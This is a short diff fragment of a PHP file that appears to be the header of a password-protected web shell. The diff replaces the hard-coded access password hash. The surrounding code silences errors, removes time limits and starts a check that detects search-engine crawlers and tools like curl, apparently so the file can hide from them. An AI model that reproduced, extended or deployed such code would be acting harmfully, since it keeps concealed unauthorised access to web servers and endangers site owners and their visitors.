@@ -3,7 +3,7 @@ session_start();
 @error_reporting(0);
 @set_time_limit(0);
 
-$hashedPassword = "9dd4e461268c8034f5c8564e155c67a6"; 
+$hashedPassword = "ae2f96f934389db14744a3224e6670ce"; 
 
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
     $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
